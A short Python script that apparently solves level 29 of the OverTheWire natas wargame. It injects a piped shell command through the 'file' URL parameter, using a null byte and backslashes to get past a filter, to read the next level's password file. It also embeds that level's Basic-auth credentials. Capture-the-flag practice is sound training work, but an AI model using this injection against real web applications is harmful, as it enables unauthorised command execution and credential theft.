#!/usr/bin/python
import urllib
import urllib2
import binascii


# 
def request_generate(URL):
    req = urllib2.Request(URL)
    req.add_header('User-Agent',  ' i dont want to tell you!!! :) ')
    req.add_header('Authorization', 'Basic bmF0YXMyOTphaXJvb0NhaXNlaXllZThoZTh4b25naWVuOWV1aGU4Yg==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174; PHPSESSID={};')
    return urllib2.urlopen(req)


# main function
def main():
    URL = 'http://natas29.natas.labs.overthewire.org/index.pl?file=|%20cat%20/etc/nata\s_webpass/nata\s30%00'
    v = request_generate(URL).read().split('\n')[-2:]
    print v
    return


if __name__=='__main__':
    main()
